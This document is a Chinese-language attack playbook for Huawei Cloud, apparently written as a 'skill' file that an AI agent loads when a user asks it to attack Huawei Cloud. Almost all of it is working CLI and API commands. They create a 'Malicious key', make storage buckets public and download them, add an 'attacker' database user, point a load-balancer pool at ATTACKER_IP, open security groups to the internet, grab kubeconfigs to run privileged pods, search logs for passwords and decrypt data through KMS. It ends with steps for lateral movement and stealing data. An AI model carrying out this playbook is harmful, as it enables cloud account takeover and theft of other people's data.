---
name: huawei-attack
type: attack
category: cloud
platform: huawei
severity: high
---

# 华为云攻击技能

## 触发条件

- 有华为云凭证（AK/SK 或 Token）
- 目标使用华为云
- 用户要求"攻击华为云"

## 前置检查

```bash
# 1. 安装华为云 CLI
pip install huaweicloud-sdk

# 2. 配置凭证
export HW_ACCESS_KEY_ID=YOUR_ACCESS_KEY_ID
export HW_SECRET_ACCESS_KEY=YOUR_SECRET_ACCESS_KEY

# 3. 验证凭证
curl -X GET https://iam.{region}.myhuaweicloud.com/v3.0/OS-CREDENTIAL/credentials

# 4. 列出 ECS 实例
openstack server list
```

## 攻击方法

### 方法 1: IAM 权限提升

```bash
# 1. 获取当前用户信息
openstack user show

# 2. 列出所有用户
openstack user list

# 3. 获取用户角色
openstack role assignment list --user USER_ID --project PROJECT_ID

# 4. 创建新的 AccessKey
# 通过 IAM API
curl -X POST https://iam.{region}.myhuaweicloud.com/v3.0/OS-CREDENTIAL/credentials \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"credential": {"description": "Malicious key"}}'
```

### 方法 2: ECS 实例攻击

```bash
# 1. 列出所有实例
openstack server list --long

# 2. 获取实例详情
openstack server show SERVER_ID

# 3. 通过 VNC 连接
openstack console url show SERVER_ID

# 4. 获取实例密码
openstack server password show SERVER_ID
```

### 方法 3: OBS 对象存储攻击

```bash
# 1. 列出所有 Bucket
# 使用 obsutil 或 SDK
obsutil ls

# 2. 列出 Bucket 内容
obsutil ls obs://BUCKET_NAME/

# 3. 下载文件
obsutil cp obs://BUCKET_NAME/OBJECT_PATH /tmp/

# 4. 设置 Bucket 为公开
# 通过 OBS API
curl -X PUT https://obs.{region}.myhuaweicloud.com/BUCKET_NAME?acl \
  -H "Authorization: $TOKEN" \
  -H "x-amz-acl: public-read"
```

### 方法 4: RDS 数据库攻击

```bash
# 1. 列出所有数据库实例
# 通过 RDS API
curl -X GET "https://rds.{region}.myhuaweicloud.com/v3/{project_id}/instances" \
  -H "X-Auth-Token: $TOKEN"

# 2. 获取数据库连接信息
curl -X GET "https://rds.{region}.myhuaweicloud.com/v3/{project_id}/instances/INSTANCE_ID" \
  -H "X-Auth-Token: $TOKEN"

# 3. 创建只读账号
curl -X POST "https://rds.{region}.myhuaweicloud.com/v3/{project_id}/instances/INSTANCE_ID/db_user" \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"db_user": {"name": "attacker", "password": "Pass123!"}}'

# 4. 导出数据库
curl -X POST "https://rds.{region}.myhuaweicloud.com/v3/{project_id}/instances/INSTANCE_ID/backup" \
  -H "X-Auth-Token: $TOKEN"
```

### 方法 5: ELB 负载均衡攻击

```bash
# 1. 列出所有负载均衡
# 通过 ELB API
curl -X GET "https://elb.{region}.myhuaweicloud.com/v2/{project_id}/elb/loadbalancers" \
  -H "X-Auth-Token: $TOKEN"

# 2. 获取后端服务器
curl -X GET "https://elb.{region}.myhuaweicloud.com/v2/{project_id}/elb/pools" \
  -H "X-Auth-Token: $TOKEN"

# 3. 修改负载均衡配置
curl -X POST "https://elb.{region}.myhuaweicloud.com/v2/{project_id}/elb/pools" \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pool": {"name": "malicious-pool", "lb_algorithm": "ROUND_ROBIN"}}'

# 4. 添加攻击者服务器
curl -X POST "https://elb.{region}.myhuaweicloud.com/v2/{project_id}/elb/pools/POOL_ID/members" \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"member": {"address": "ATTACKER_IP", "protocol_port": 80}}'
```

### 方法 6: 安全组利用

```bash
# 1. 列出所有安全组
openstack security group list

# 2. 获取安全组规则
openstack security group rule list SG_ID

# 3. 添加后门规则（开放所有端口）
openstack security group rule create \
  --proto tcp \
  --dst-port 1:65535 \
  --remote-ip 0.0.0.0/0 \
  SG_ID

# 4. 开放攻击者 IP
openstack security group rule create \
  --proto tcp \
  --dst-port 22 \
  --remote-ip ATTACKER_IP/32 \
  SG_ID
```

### 方法 7: CCE 容器引擎攻击

```bash
# 1. 列出所有集群
# 通过 CCE API
curl -X GET "https://cce.{region}.myhuaweicloud.com/api/v3/projects/{project_id}/clusters" \
  -H "X-Auth-Token: $TOKEN"

# 2. 获取集群凭证
curl -X GET "https://cce.{region}.myhuaweicloud.com/api/v3/projects/{project_id}/clusters/CLUSTER_ID/kubeconfig" \
  -H "X-Auth-Token: $TOKEN"

# 3. 如果可以访问 K8s API
kubectl get nodes --kubeconfig=kubeconfig.yaml
kubectl get pods --all-namespaces --kubeconfig=kubeconfig.yaml

# 4. 创建特权 Pod
kubectl run privileged-pod --image=alpine \
  --overrides='{"spec":{"containers":[{"name":"privileged","securityContext":{"privileged":true}}]}}' \
  --kubeconfig=kubeconfig.yaml
```

### 方法 8: FunctionGraph 攻击

```bash
# 1. 列出所有函数
# 通过 FunctionGraph API
curl -X GET "https://functiongraph.{region}.myhuaweicloud.com/v2/{project_id}/fgs/functions" \
  -H "X-Auth-Token: $TOKEN"

# 2. 获取函数代码
curl -X GET "https://functiongraph.{region}.myhuaweicloud.com/v2/{project_id}/fgs/functions/FUNCTION_URN/code" \
  -H "X-Auth-Token: $TOKEN"

# 3. 获取环境变量
curl -X GET "https://functiongraph.{region}.myhuaweicloud.com/v2/{project_id}/fgs/functions/FUNCTION_URN/config" \
  -H "X-Auth-Token: $TOKEN"

# 4. 查看函数日志
curl -X GET "https://functiongraph.{region}.myhuaweicloud.com/v2/{project_id}/fgs/functions/FUNCTION_URN/logs" \
  -H "X-Auth-Token: $TOKEN"
```

### 方法 9: 云日志服务利用

```bash
# 1. 列出所有日志组
# 通过 LTS API
curl -X GET "https://lts.{region}.myhuaweicloud.com/v2/{project_id}/groups" \
  -H "X-Auth-Token: $TOKEN"

# 2. 搜索日志
curl -X POST "https://lts.{region}.myhuaweicloud.com/v2/{project_id}/streams/{stream_id}/content/query" \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "password|secret|token", "from": START_TIME, "to": END_TIME}'

# 3. 导出日志
curl -X GET "https://lts.{region}.myhuaweicloud.com/v2/{project_id}/logs/{log_id}" \
  -H "X-Auth-Token: $TOKEN"
```

### 方法 10: 密钥管理利用

```bash
# 1. 列出所有密钥
# 通过 KPS API
curl -X GET "https://kps.{region}.myhuaweicloud.com/v1.0/{project_id}/kms/keys" \
  -H "X-Auth-Token: $TOKEN"

# 2. 获取密钥详情
curl -X GET "https://kps.{region}.myhuaweicloud.com/v1.0/{project_id}/kms/keys/KEY_ID" \
  -H "X-Auth-Token: $TOKEN"

# 3. 解密数据
curl -X POST "https://kps.{region}.myhuaweicloud.com/v1.0/{project_id}/kms/decrypt" \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cipher_text": "ENCRYPTED_DATA"}'

# 4. 创建新密钥
curl -X POST "https://kps.{region}.myhuaweicloud.com/v1.0/{project_id}/kms/keys" \
  -H "X-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"key_alias": "attacker", "key_spec": "AES_256"}'
```

## 验证成功

```bash
# 成功验证凭证
curl -X GET https://iam.{region}.myhuaweicloud.com/v3.0/OS-CREDENTIAL/credentials

# 成功列出实例
openstack server list

# 成功访问 OBS
obsutil ls obs://BUCKET_NAME/
```

## 下一步

1. 使用窃取的凭证访问更多华为云服务
2. 通过 ECS 实例横向移动
3. 利用 OBS 窃取敏感数据
4. 通过 CCE 攻击 K8s 集群
